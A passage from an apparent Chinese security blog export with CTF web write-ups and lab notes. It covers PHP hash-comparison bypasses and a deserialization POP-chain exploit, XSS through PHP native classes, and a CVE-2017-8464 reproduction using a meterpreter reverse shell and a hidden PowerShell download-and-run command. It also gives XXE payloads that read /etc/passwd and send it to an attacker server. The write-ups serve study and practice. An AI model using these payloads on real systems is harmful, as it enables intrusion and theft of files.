<p>第一关，需要使得md4(hash1)==hash1,这里可以利用科学计数法来绕过，也就是要找一个0e+数字的值，它md4后也是0e+数字<br><a href="https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4" target="_blank" rel="noopener">https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hash1=0e001233333333333334557778889</span><br></pre></td></tr></table></figure><br>第二关，两个参数值不同，但是md5后需要相等，直接数组绕过即可<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hash2[]=abc&amp;hash3=zxv</span><br></pre></td></tr></table></figure><br>第三关，sql注入绕过,在buu上有道例题<br><a href="https://zxfireworks.xyz/post/e9141edc.html#BJDCTF2020-Easy-MD5" target="_blank" rel="noopener">https://zxfireworks.xyz/post/e9141edc.html#BJDCTF2020-Easy-MD5</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hash4=ffifdyop</span><br></pre></td></tr></table></figure><br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?hash1=0e001233333333333334557778889&amp;hash2[]=abc&amp;hash3=zxv&amp;hash4=ffifdyop</span><br></pre></td></tr></table></figure></p>
<h3 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h3><p>git源码泄露，GitHack直接拉下来，四个php文件<br>class.php<br>用来构造POP链：topsolo::<strong>destruct()=&gt;topsolo::TP()=&gt;midsolo::</strong>invoke()=&gt;midsolo::Gank()=&gt;jungle::__toString()=&gt;jungle::KS(),从而执行命令<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $user;</span><br><span class="line">    <span class="keyword">protected</span> $pass;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass, $admin = <span class="number">0</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $admin;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</span><br><span class="line">            $name = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">            $name();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;TP();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"cat /flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;KS();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>common.php<br>read方法和write方法会造成字符逃逸，一次逃逸两个字符，chech函数检测是否存在name,可以使用十六进制绕过，即\6eame<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'name'</span>)!==<span class="keyword">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Name Pass\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>index.php<br>将参数username和password作为palyer的字段值序列化，经过write方法写入文件<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">	$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">	$player = <span class="keyword">new</span> player($username, $password);</span><br><span class="line">	file_put_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), write(serialize($player))); </span><br><span class="line">	<span class="keyword">echo</span> sprintf(<span class="string">'Welcome %s, your ip is %s\n'</span>, $username, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Please input the username or password!\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>play.php<br>从文件中读出数据，经过check函数检测，read方法处理后反序列化<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">@$player = unserialize(read(check(file_get_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>])))));</span><br><span class="line">print_r($player);</span><br><span class="line"><span class="keyword">if</span> ($player-&gt;get_admin() === <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"FPX Champion\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"The Shy unstoppable\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>POP链exp:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</span><br><span class="line">            $name = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">            $name();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;TP();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//system("cat /flag");</span></span><br><span class="line">        system(<span class="string">"ls /"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;KS();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$jun = <span class="keyword">new</span> jungle(<span class="string">"Lee Sin"</span>);</span><br><span class="line">$mid = <span class="keyword">new</span> midsolo($jun);</span><br><span class="line">$top = <span class="keyword">new</span> topsolo($mid);</span><br><span class="line">$res = serialize($top);</span><br><span class="line"><span class="keyword">echo</span> $res.<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">//O:7:"topsolo":1:&#123;S:7:"\00*\00\6eame";O:7:"midsolo":1:&#123;S:7:"\00*\00\6eame";O:6:"jungle":1:&#123;S:7:"\00*\00\6eame";s:7:"Lee Sin";&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>PHP原生类反序列化</title>
    <url>/post/7085eacc.html</url>
    <content><![CDATA[<p>做了很多道PHP反序列化的题目，还没遇到过这种，做完决定来总结一下<br><a href="https://zxfireworks.xyz/post/d3333ead.html" target="_blank" rel="noopener">PHP反序列化</a></p>
<h3 id="利用-toString方法产生XSS"><a href="#利用-toString方法产生XSS" class="headerlink" title="利用__toString方法产生XSS"></a>利用__toString方法产生XSS</h3><p>下面分别对两种利用方法进行复现<br>0x00:Error(适用于PHP7版本)<br>测试源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">'w1ndy'</span>];</span><br><span class="line"><span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>exp:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = new Error(<span class="string">"&lt;script&gt;alert('w1ndy')&lt;/script&gt;"</span>);</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?w1ndy=O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A31%3A%22%3Cscript%3Ealert%28%27w1ndy%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A40%3A%22D%3A%5Cphpstudy%5Cphpstudy_pro%5CWWW%5Ctestxss.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpxss/phpxss0.jpg" alt=""><br>0x01:Exception(适用于PHP5、PHP7版本)<br>测试源码同上<br>exp:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = new Exception(<span class="string">"&lt;script&gt;alert('w1ndy')&lt;/script&gt;"</span>);</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?w1ndy=O%3A9%3A<span class="string">"Exception"</span>%3A7%3A%7Bs%3A10%3A<span class="string">"%00%2A%00message"</span>%3Bs%3A31%3A<span class="string">"&lt;script&gt;alert%28%27w1ndy%27%29&lt;%2Fscript&gt;"</span>%3Bs%3A17%3A<span class="string">"%00Exception%00string"</span>%3Bs%3A0%3A<span class="string">""</span>%3Bs%3A7%3A<span class="string">"%00%2A%00code"</span>%3Bi%3A0%3Bs%3A7%3A<span class="string">"%00%2A%00file"</span>%3Bs%3A40%3A<span class="string">"D%3A%5Cphpstudy%5Cphpstudy_pro%5CWWW%5Ctestxss.php"</span>%3Bs%3A7%3A<span class="string">"%00%2A%00line"</span>%3Bi%3A2%3Bs%3A16%3A<span class="string">"%00Exception%00trace"</span>%3Ba%3A0%3A%7B%7Ds%3A19%3A<span class="string">"%00Exception%00previous"</span>%3BN%3B%7D</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpxss/phpxss1.jpg" alt=""></p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="https://zxfireworks.xyz/post/e9141edc.html#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89" target="_blank" rel="noopener">https://zxfireworks.xyz/post/e9141edc.html#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89</a></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2017-8464</title>
    <url>/post/d4ac486b.html</url>
    <content><![CDATA[<p>震网三代</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>windows 10<br>windwos RT 8.1<br>windows 8.1<br>windows 7<br>windows server 2016<br>windows server 2012 R2<br>windows server 2012<br>windows server 2008 R2<br>windows server 2008</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>攻击机：kali<br>攻击机ip地址：192.168.168.130<br>攻击机监听端口：6666<br>靶机：Windows 10</p>
<h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="Powershell快捷方式-关闭杀软"><a href="#Powershell快捷方式-关闭杀软" class="headerlink" title="Powershell快捷方式(关闭杀软)"></a>Powershell快捷方式(关闭杀软)</h4><p>在kali中生成攻击文件，并将其放在apache服务器根目录下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.168.130 lport=6666 -f  psh-reflection &gt; /var/www/html/search.ps1</span><br></pre></td></tr></table></figure><br>在kali中启动apache服务器<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><br>然后使用metasploit对靶机进行渗透<br>打开metasploit<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><br>使用监听模块<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><br>show一下options，配置一下需要配置的选项<br>配置参数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.168.130</span><br><span class="line"><span class="built_in">set</span> lport 6666</span><br></pre></td></tr></table></figure><br>运行exp<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><br>接下来来到靶机Windows 10,在桌面新建一个快捷方式，在对象的位置处填入如下内容：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell -windowstyle hidden -<span class="built_in">exec</span> bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.168.130/search.ps1‘);test.ps1"</span></span><br></pre></td></tr></table></figure><br>创建好后点击运行该快捷方式，这时在kali中就可以看到返回了一个session,shell命令就可进入win10的命令行了</p>
<h4 id="U盘-开启USB自动播放"><a href="#U盘-开启USB自动播放" class="headerlink" title="U盘(开启USB自动播放)"></a>U盘(开启USB自动播放)</h4><p>打开metasploit,搜索该漏洞的exp(metasploit已经内置)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search cve-2017-8464</span><br></pre></td></tr></table></figure><br>可以得到一个exp:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/windows/fileformat/cve_2017_8464_lnk_rce</span><br></pre></td></tr></table></figure><br>使用该exp<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/fileformat/cve_2017_8464_lnk_rce</span><br></pre></td></tr></table></figure><br>设置载荷<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><br>配置ip和监听端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.168.130</span><br><span class="line"><span class="built_in">set</span> lport 6666</span><br></pre></td></tr></table></figure><br>执行exploit命令，生成的文件在/root/.msf4/local下，注意.msf4是隐藏文件，记得开启显示隐藏文件，将local目录下的文件复制到U盘中<br>继续来到kali中，使用监听模块<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><br>设置相关配置(与上方的配置相同)<br>配置好后开启监听,执行exploit<br>接下来就可以将U盘插入靶机了。如果靶机设置了自动播放，那就会直接运行FlashPlayerCPLApp.cpl文件，然后会反弹一个session给kali。如果没开启，则需要点击运行该文件</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>XXE利用方法</title>
    <url>/post/f7708bc5.html</url>
    <content><![CDATA[<p>最近刷题碰到了好几个考察XXE漏洞利用的，想着总结一下常用解题姿势</p>
<h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dom</span> = new DOMDocument();</span><br><span class="line"><span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="variable">$test</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$test</span>;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>burp抓包后直接修改xml实体，常用Payload如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE w1ndy [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;w1ndy&gt;&amp;xxe;&lt;/w1ndy&gt;</span><br></pre></td></tr></table></figure><br>上述方法也有缺陷，当里待读取的文件中含有&lt;&gt;//,&amp;等特殊字符时，file协议是无法读取的，所以可以利用php的filter伪协议将文件内容base64编码后再读出来<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE w1ndy [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/etc/passwd"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;w1ndy&gt;&amp;xxe;&lt;/w1ndy&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="有回显例题"><a href="#有回显例题" class="headerlink" title="有回显例题"></a>有回显例题</h4><p><a href="https://zxfireworks.xyz/post/e9141edc.html#NCTF2019-Fake-XML-cookbook" target="_blank" rel="noopener">https://zxfireworks.xyz/post/e9141edc.html#NCTF2019-Fake-XML-cookbook</a><br><a href="https://zxfireworks.xyz/post/e9141edc.html#NCTF2019-True-XML-cookbook" target="_blank" rel="noopener">https://zxfireworks.xyz/post/e9141edc.html#NCTF2019-True-XML-cookbook</a></p>
<h3 id="无回显-Blind-XXE"><a href="#无回显-Blind-XXE" class="headerlink" title="无回显(Blind XXE)"></a>无回显(Blind XXE)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"><span class="variable">$dom</span> = new DOMDocument();</span><br><span class="line"><span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br></pre></td></tr></table></figure>
<p>使用上述Payload并不能得到回显时，可以考虑外带<br>首先在自己的服务器上建立一个aaa.dtd文件，内容如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:port/?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><br>这里的ip是自己服务器的ip,端口就是要用来监听的端口。在该服务器上开启监听后<br>在题目端用burp来抓包将如下Payload替换题目中的xml实体<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE w1ndy [</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM <span class="string">"http://ip/aaa.dtd"</span>&gt;</span><br><span class="line">%xxe;%int;%send;]&gt;</span><br></pre></td></tr></table></figure><br>这里的ip就是自己服务器的ip,aaa.dtd文件就是在自己服务器建的那个<br>过程如下：<br>burp将请求发送给题目端后，题目端解析了xml代码就会反过来请求我们自己服务器上的aaa.dtd文件，我们自己服务器将aaa.dtd文件返回给题目端，题目端就会解析，解析后根据aaa.dtd中代码的作用，题目端会给我们返回一个响应，并且会将其中设置的目标文件passwd顺便外带出来，这样我们在自己的服务端就能接收到这个响应，也就能拿到目标文件的内容了</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>docker搭建CTFd平台</title>
    <url>/post/e33302b4.html</url>
